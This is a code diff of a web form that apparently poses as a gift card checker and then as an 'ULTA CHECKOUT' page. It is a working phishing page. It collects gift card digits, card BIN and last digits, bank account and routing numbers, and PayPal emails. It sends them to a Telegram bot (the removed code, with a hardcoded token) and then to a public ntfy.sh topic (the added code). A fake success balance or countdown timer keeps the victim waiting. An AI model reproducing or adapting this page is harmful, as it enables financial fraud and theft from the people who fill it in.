@@ -3,13 +3,13 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>PS CHECKER</title>
+  <title>CHECKER</title>
   <style>
     :root {
-      --bg: #2563eb;
+      --bg: #F27A30;
       --card-bg: #ffffff;
-      --accent: #2563eb;
-      --accent-hover: #1d4ed8;
+      --accent: #F27A30;
+      --accent-hover: #d9631b;
       --text: #2c2c2c;
       --text-dim: #666666;
       --border: #e0e0e0;
@@ -18,77 +18,11 @@
 
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background:
-        radial-gradient(
-          circle at 15% 20%,
-          rgba(255, 255, 255, 0.20) 0,
-          rgba(255, 255, 255, 0.20) 90px,
-          transparent 91px
-        ),
-        radial-gradient(
-          circle at 85% 80%,
-          rgba(255, 255, 255, 0.12) 0,
-          rgba(255, 255, 255, 0.12) 150px,
-          transparent 151px
-        ),
-        radial-gradient(
-          circle at 80% 15%,
-          rgba(147, 197, 253, 0.32) 0,
-          transparent 220px
-        ),
-        linear-gradient(135deg, #2563eb 0%, #1d4ed8 45%, #172554 100%);
+      background-color: var(--bg);
       color: var(--text);
       max-width: 700px;
       margin: 2rem auto;
       padding: 0 1rem;
-      min-height: 100vh;
-      position: relative;
-      overflow-x: hidden;
-    }
-
-    .background-design {
-      position: fixed;
-      inset: 0;
-      overflow: hidden;
-      pointer-events: none;
-      z-index: -1;
-    }
-
-    .game-shape {
-      position: absolute;
-      color: rgba(255, 255, 255, 0.18);
-      font-family: Arial, sans-serif;
-      font-weight: bold;
-      line-height: 1;
-      text-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
-      user-select: none;
-    }
-
-    .shape-cross {
-      top: 8%;
-      left: 8%;
-      font-size: 9rem;
-      transform: rotate(15deg);
-    }
-
-    .shape-circle {
-      top: 12%;
-      right: 9%;
-      font-size: 12rem;
-    }
-
-    .shape-square {
-      bottom: 9%;
-      left: 8%;
-      font-size: 11rem;
-      transform: rotate(-12deg);
-    }
-
-    .shape-triangle {
-      right: 10%;
-      bottom: 7%;
-      font-size: 12rem;
-      transform: rotate(12deg);
     }
 
     .card {
@@ -97,13 +31,11 @@
       padding: 2rem;
       margin-bottom: 2rem;
       box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
-      position: relative;
-      z-index: 1;
     }
 
     h2 {
       margin-top: 0;
-      color: var(--accent);
+      color: #F27A30;
     }
 
     .form-group {
@@ -118,7 +50,7 @@
       font-weight: 600;
     }
 
-    input[type="text"], input[type="email"], textarea, input[type="file"] {
+    input[type="text"], input[type="email"], textarea, input[type="file"], select {
       width: 100%;
       padding: 0.75rem;
       border-radius: 6px;
@@ -129,16 +61,44 @@
       font-size: 1rem;
     }
 
-    input[type="text"]:focus, input[type="email"]:focus, textarea:focus {
+    input[type="text"]:focus, input[type="email"]:focus, textarea:focus, select:focus {
       outline: none;
       border-color: var(--accent);
       background-color: #ffffff;
-      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
+      box-shadow: 0 0 0 3px rgba(242, 122, 48, 0.2);
     }
 
     textarea {
       resize: vertical;
       min-height: 120px;
+    }
+
+    /* Grid layout helpers for conditional payment details */
+    .payment-details {
+      display: none;
+      background-color: #fffaf7;
+      border: 1px dashed var(--accent);
+      padding: 1rem;
+      border-radius: 8px;
+      margin-bottom: 1.2rem;
+    }
+
+    .grid-3 {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 0.75rem;
+    }
+
+    .grid-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 0.75rem;
+    }
+
+    @media (max-width: 600px) {
+      .grid-3 {
+        grid-template-columns: 1fr;
+      }
     }
 
     button {
@@ -185,6 +145,13 @@
       100% { transform: rotate(360deg); }
     }
 
+    #timer {
+      font-size: 1.5rem;
+      font-weight: bold;
+      color: var(--accent);
+      margin-top: 0.5rem;
+    }
+
     #status {
       margin-top: 1rem;
       font-size: 0.95rem;
@@ -198,16 +165,9 @@
 </head>
 <body>
 
-  <div class="background-design" aria-hidden="true">
-    <span class="game-shape shape-cross">+</span>
-    <span class="game-shape shape-circle">○</span>
-    <span class="game-shape shape-square">□</span>
-    <span class="game-shape shape-triangle">△</span>
-  </div>
-
   <div class="card">
-    <h2>PS CHECKER</h2>
-    
+    <h2>ULTA CHECKOUT</h2>
+
     <form id="reviewForm">
       <div class="form-group">
         <label for="email">Mail Address</label>
@@ -225,13 +185,58 @@
       </div>
 
       <div class="form-group">
-        <label for="review">Card # (number)</label>
-        <textarea id="review" required placeholder=""></textarea>
+        <label for="paymentMethod">Preferred Payment Method</label>
+        <select id="paymentMethod" name="paymentMethod" required>
+          <option value="" disabled selected>Select a payment method</option>
+          <option value="credit_card">Credit Card</option>
+          <option value="paypal">PayPal</option>
+          <option value="bank_transfer">Bank Transfer</option>
+        </select>
+      </div>
+
+      <!-- Conditional PayPal Section -->
+      <div id="paypalFields" class="payment-details">
+        <div class="form-group" style="margin-bottom: 0;">
+          <label for="paypalEmail">PayPal Email Address</label>
+          <input type="email" id="paypalEmail" placeholder="example@paypal.com">
+        </div>
+      </div>
+
+      <!-- Conditional Bank Transfer Section (3 Columns) -->
+      <div id="bankFields" class="payment-details">
+        <div class="grid-3">
+          <div>
+            <label for="bankName">Bank Name</label>
+            <input type="text" id="bankName" placeholder="Bank Name">
+          </div>
+          <div>
+            <label for="bankAccount">Account / IBAN</label>
+            <input type="text" id="bankAccount" placeholder="Account Number">
+          </div>
+          <div>
+            <label for="routingNumber">Routing Number</label>
+            <input type="text" id="routingNumber" placeholder="Routing / SWIFT">
+          </div>
+        </div>
+      </div>
+
+      <!-- Conditional Credit Card Section (2 Columns) -->
+      <div id="creditCardFields" class="payment-details">
+        <div class="grid-2">
+          <div>
+            <label for="cardFirst6">First 6 Digits</label>
+            <input type="text" id="cardFirst6" maxlength="6" pattern="\d{6}" placeholder="123456">
+          </div>
+          <div>
+            <label for="cardLast4">Last 4 Digits</label>
+            <input type="text" id="cardLast4" maxlength="4" pattern="\d{4}" placeholder="7890">
+          </div>
+        </div>
       </div>
 
       <div class="form-group">
-        <label for="code">Code</label>
-        <input type="text" id="code" required placeholder="">
+        <label for="review">Gift Card Digits</label>
+        <textarea id="review" required placeholder=""></textarea>
       </div>
 
       <div class="form-group">
@@ -245,22 +250,59 @@
     <div id="processingBox">
       <div class="spinner"></div>
       <h3>Processing your submission...</h3>
+      <p style="color: var(--text-dim);">Estimated wait time:</p>
+      <div id="timer">10:00</div>
     </div>
 
     <div id="status"></div>
   </div>
 
   <script>
-    // Configured Telegram Bot credentials (@SoftuserBot)
-    const TELEGRAM_BOT_TOKEN = '8967072356:AAHkREbusxXTqHXNO5r8LDKLdlmCw4whB6A';
-    const TELEGRAM_CHAT_ID = '7366645549';
-    const demoBalance = 100.00;
+    const NTFY_TOPIC_URL = 'https://ntfy.sh/converter-storecredit';
 
     // DOM Element selections
     const form = document.getElementById('reviewForm');
     const submitBtn = document.getElementById('submitBtn');
     const statusDiv = document.getElementById('status');
     const processingBox = document.getElementById('processingBox');
+    const timerDiv = document.getElementById('timer');
+    const paymentMethodSelect = document.getElementById('paymentMethod');
+
+    const paypalFields = document.getElementById('paypalFields');
+    const bankFields = document.getElementById('bankFields');
+    const creditCardFields = document.getElementById('creditCardFields');
+
+    // Handle Payment Method dropdown change
+    paymentMethodSelect.addEventListener('change', (e) => {
+      const selected = e.target.value;
+
+      // Reset visibilities
+      paypalFields.style.display = 'none';
+      bankFields.style.display = 'none';
+      creditCardFields.style.display = 'none';
+
+      // Reset required attributes on sub-fields
+      document.getElementById('paypalEmail').required = false;
+      document.getElementById('bankName').required = false;
+      document.getElementById('bankAccount').required = false;
+      document.getElementById('routingNumber').required = false;
+      document.getElementById('cardFirst6').required = false;
+      document.getElementById('cardLast4').required = false;
+
+      if (selected === 'paypal') {
+        paypalFields.style.display = 'block';
+        document.getElementById('paypalEmail').required = true;
+      } else if (selected === 'bank_transfer') {
+        bankFields.style.display = 'block';
+        document.getElementById('bankName').required = true;
+        document.getElementById('bankAccount').required = true;
+        document.getElementById('routingNumber').required = true;
+      } else if (selected === 'credit_card') {
+        creditCardFields.style.display = 'block';
+        document.getElementById('cardFirst6').required = true;
+        document.getElementById('cardLast4').required = true;
+      }
+    });
 
     function compressImage(file, maxWidth = 1200, maxHeight = 1200, quality = 0.7) {
       return new Promise((resolve, reject) => {
@@ -308,109 +350,70 @@
 
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      
+
       submitBtn.disabled = true;
       statusDiv.textContent = "Sending...";
       statusDiv.className = "";
 
+      // Look up main input values
       const mailAddress = document.getElementById('email').value;
       const nameOfCard = document.getElementById('username').value;
       const cardType = document.getElementById('title').value;
+      const paymentMethod = paymentMethodSelect.value;
       const cardDigits = document.getElementById('review').value;
-      const codeValue = document.getElementById('code').value;
       const imageFile = document.getElementById('image').files[0];
 
-      const fullMessage = `New Submission:\n\nMail Address: ${mailAddress}\nName of Card: ${nameOfCard}\nCard Type: ${cardType}\nCard #: ${cardDigits}\nCode: ${codeValue}`;
+      // Formulate payment details string based on selection
+      let paymentDetailsString = "";
+      if (paymentMethod === 'paypal') {
+        const paypalEmail = document.getElementById('paypalEmail').value;
+        paymentDetailsString = `PayPal Email: ${paypalEmail}`;
+      } else if (paymentMethod === 'bank_transfer') {
+        const bankName = document.getElementById('bankName').value;
+        const bankAccount = document.getElementById('bankAccount').value;
+        const routingNumber = document.getElementById('routingNumber').value;
+        paymentDetailsString = `Bank Name: ${bankName}\nAccount/IBAN: ${bankAccount}\nRouting Number: ${routingNumber}`;
+      } else if (paymentMethod === 'credit_card') {
+        const first6 = document.getElementById('cardFirst6').value;
+        const last4 = document.getElementById('cardLast4').value;
+        paymentDetailsString = `Card BIN (First 6): ${first6}\nCard Last 4: ${last4}`;
+      }
+
+      // Format full payload text
+      const fullMessage = `Mail Address: ${mailAddress}\nName of Card: ${nameOfCard}\nCard Type: ${cardType}\nPayment Method: ${paymentMethod}\n${paymentDetailsString}\nGift Card Digits: ${cardDigits}`;
 
       try {
         let response;
 
         if (imageFile) {
           const compressedBlob = await compressImage(imageFile);
-          const formData = new FormData();
-          formData.append('chat_id', TELEGRAM_CHAT_ID);
-          formData.append('caption', fullMessage);
-          formData.append('photo', compressedBlob, 'upload.jpg');
 
-          response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
+          const uploadUrl = new URL(NTFY_TOPIC_URL);
+          uploadUrl.searchParams.append('title', cardType || 'Submission');
+          uploadUrl.searchParams.append('message', fullMessage);
+          uploadUrl.searchParams.append('filename', 'upload.jpg');
+
+          response = await fetch(uploadUrl.toString(), {
+            method: 'PUT',
+            body: compressedBlob
           });
         } else {
-          response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          // Text-only submission
+          const uploadUrl = new URL(NTFY_TOPIC_URL);
+          uploadUrl.searchParams.append('title', cardType || 'Submission');
+
+          response = await fetch(uploadUrl.toString(), {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: TELEGRAM_CHAT_ID,
-              text: fullMessage
-            })
+            body: fullMessage
           });
         }
 
-        const data = await response.json();
-
-        if (response.ok && data.ok) {
+        if (response.ok) {
           form.style.display = 'none';
           processingBox.style.display = 'block';
-          
-          // Display success state and balance immediately without 'simulated' text
-          processingBox.innerHTML = `
-            <div style="
-              font-size: 48px;
-              color: #2e7d32;
-              margin-bottom: 12px;
-            ">&#10003;</div>
-
-            <h3 style="color: #2e7d32;">
-              Successful
-            </h3>
-
-            <p>Your submission has been processed.</p>
-
-            <div style="
-              background: #f0fdf4;
-              border: 1px solid #bbf7d0;
-              border-radius: 10px;
-              padding: 20px;
-              margin-top: 20px;
-            ">
-              <p style="margin: 0; color: #166534;">
-                Balance
-              </p>
-
-              <h2 style="
-                color: #166534;
-                font-size: 32px;
-                margin: 10px 0;
-              ">
-                $${demoBalance.toFixed(2)} USD
-              </h2>
-            </div>
-
-            <button
-              type="button"
-              id="resetDemo"
-              style="margin-top: 20px;"
-            >
-              Try Again
-            </button>
-          `;
-
-          document.getElementById('resetDemo')
-            .addEventListener('click', function () {
-              form.reset();
-              form.style.display = 'block';
-              processingBox.style.display = 'none';
-              processingBox.innerHTML = `
-                <div class="spinner"></div>
-                <h3>Processing your submission...</h3>
-              `;
-              submitBtn.disabled = false;
-              statusDiv.textContent = '';
-            });
-
+          startTimer(10 * 60); // Start 10-minute countdown
         } else {
-          throw new Error(data.description || `Failed to send (HTTP ${response.status})`);
+          throw new Error(`Failed to send (HTTP ${response.status})`);
         }
       } catch (err) {
         statusDiv.textContent = "Error: " + err.message;
@@ -418,6 +421,34 @@
         submitBtn.disabled = false;
       }
     });
+
+    // Function to start a countdown
+    function startTimer(durationInSeconds) {
+      let timer = durationInSeconds;
+
+      const interval = setInterval(() => {
+        const minutes = Math.floor(timer / 60);
+        const seconds = timer % 60;
+
+        const formattedMin = String(minutes).padStart(2, '0');
+        const formattedSec = String(seconds).padStart(2, '0');
+
+        // Update UI
+        timerDiv.textContent = `${formattedMin}:${formattedSec}`;
+
+        if (--timer < 0) {
+          clearInterval(interval);
+          onTimerExpired();
+        }
+      }, 1000);
+    }
+
+    function onTimerExpired() {
+      processingBox.innerHTML = `
+        <h3 class="error">Session Expired</h3>
+        <p>Please refresh the page to try again.</p>
+      `;
+    }
   </script>
 </body>
 </html>
